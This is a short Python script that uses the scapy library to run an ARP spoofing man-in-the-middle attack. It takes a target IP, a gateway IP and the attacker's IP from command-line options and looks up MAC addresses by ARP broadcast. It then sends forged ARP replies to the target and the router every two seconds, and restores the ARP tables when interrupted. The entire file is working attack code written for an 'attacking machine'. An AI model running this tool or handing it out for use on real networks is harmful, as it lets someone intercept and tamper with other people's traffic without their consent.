#!/usr/bin/python

import scapy.all as scapy
import optparse
import time

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target-ip", dest="dest_ip", help="please input a valid ip address of your target")
    parser.add_option("-g", "--gateway-ip", dest="src_ip", help="please input a valid ip address of the machine you are impersonating")
    parser.add_option("-l", "--local-ip", dest="local_ip", help="Please input the ip address for your host on the same network as your target.")
    (options, arguments) = parser.parse_args()

    if not options.dest_ip:
        print("[-] Please enter a valid target ip")
    elif not options.local_ip:
        print("[-] Please enter the local ip address for your attacking machine's network interface shared with the target.")
    elif not options.src_ip:
        print("[-] Please enter a valid ip you would like to impersonate.")
    else:
        return options

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answered_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    for element in answered_list:
        list = [element[1].psrc, element[1].hwsrc]
        return list[1]

def spoof(target_ip, spoof_ip, local_ip):
    dest_mac = get_mac(target_ip)
    host_mac = get_mac(local_ip)
    arp_resp = scapy.ARP(op=2,pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=host_mac)
    scapy.send(arp_resp, verbose=False)
    #print(arp_resp.summary())

options = get_arguments()

def restore(target_ip, spoof_ip):
    dest_mac = get_mac(target_ip)
    src_mac = get_mac(spoof_ip)
    arp_resp = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=src_mac)
    scapy.send(arp_resp, verbose=False)
    #print(arp_resp.summary())
print(get_mac("192.168.0.1"))
try:
    print("[+] spoofing arp on target and router...")
    while True:
        spoof(options.dest_ip, options.src_ip, options.local_ip)
        spoof(options.src_ip, options.dest_ip, options.local_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Restoring ARP Tables...")
    restore(options.dest_ip, options.src_ip)
    restore(options.src_ip, options.dest_ip)
    print("\n[+] Done! Quitting...")
